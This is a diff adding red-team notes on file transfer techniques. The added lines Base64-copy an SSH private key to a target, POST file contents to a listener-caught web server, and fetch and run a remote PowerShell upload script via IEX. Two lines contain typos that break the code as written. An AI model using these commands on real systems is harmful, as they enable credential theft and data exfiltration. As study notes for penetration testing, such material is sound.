@@ -13,12 +13,24 @@ Sometimes to bypass defences and detection mechanisms, we need to use various me
 - Doesn't require any network communication to transfer the file (only shell connection)
 - It is important to check the hash of the payload on both sides to ensure its transferred correctly (eg. MD5)
 - *CMD is limited to 8191 characters, so this will not work for larger files*
-### Example transferring an SSH key
+
+**Example transferring an SSH key**
 1. Check hash of key : `md5sum id_rsa`
 2. Encode key : `cat id_rsa | base64; echo`
 3. Copy contents to target machine
 4. Use PowerShell to decode : `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64_string>"))`
 5. Confirm hash : `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`
+
+The same Base64 techniques can be used to upload files to a web server
+```PowerShell
+$b64 = [System.convert]::ToBase64S=tring((Get-Content -Path '<File Path>' -Encoding Byte))
+Invoke-WebRequest -Uri '<Webserver Address>' -Method POST -Body $b64
+```
+
+We can listen on a port with `nc` to catch the incoming request and the data.
+```bash
+nc -lvnp 4444
+```
 
 ## PowerShell Web Downloads
 - Most companies allow *HTTP* and *HTTPS* traffic through the firewall.
@@ -52,6 +64,22 @@ Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Location>'
 ```
 [More Examples](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
+## PowerShell Web Uploads
+- PowerShell has no upload function by default but `Invoke-WebRequest` & `Invoke-RestMethod` can be used to build our upload function.
+- We will also need a webserver capable of accepting file uploads.
+
+First, create a webserver that is capable of handling file uploads. `uploadserver` is a python HTTP.server module extension for uploads.
+```bash
+pip3 install uploadserver
+
+python3 -m uploadserver
+```
+
+We can then use a tool like [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform upload operations in PowerShell.
+```PowerShell
+IEX(New-Obeject Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri 'http://<ip>/upload' -File '<File Path>'
+```
 ## SMB Downloads
 SMB works on TCP port 445, and can be used to transfer files to a target system.
 
@@ -83,4 +111,9 @@ We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By
 ```bash
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21
+```
+
+We can then download it via PowerShell on the target
+```PowerShell
+(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<Output File Location')
 ```
